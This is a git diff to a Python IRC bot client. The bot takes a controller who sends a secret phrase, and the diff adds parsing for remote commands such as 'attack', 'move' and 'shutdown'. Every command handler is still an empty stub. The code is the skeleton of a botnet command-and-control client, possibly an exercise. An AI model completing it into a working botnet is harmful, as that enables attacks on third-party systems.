@@ -44,9 +44,10 @@ class botClient:
             # validate message (check if controller command)
             if not self.check_msg(text):
                 continue
+            input_list = text.split(' :')
+            command = input_list[1]
 
-            # _, command = text.split(" :") # get the message itself
-            # self.receive_command(command)
+            self.receive_command(command)
 
         self.irc_socket.close()
 
@@ -70,7 +71,7 @@ class botClient:
 
         # if no controller is defined
         if self.controller is None:
-            # if the secret phrase is in the message, assign the controller
+            # if the message is the secret phrase, assign the controller
             if self.secret_phrase in message:
                 self.controller = sender
                 self.controller_nick, _ = sender.split('!')
@@ -84,8 +85,17 @@ class botClient:
             return False
 
     def receive_command(self, command):
-        pass
-
+        # TODO add function call for each command
+        if command.startswith("attack"): 
+            pass
+        elif command.startswith("move"):
+            pass
+        elif command == "status":
+            pass
+        elif command == "quit":
+            pass
+        elif command == "shutdown":
+            pass
 
     # Code adapted from: https://pythonspot.com/en/building-an-irc-bot/
     def get_text(self):
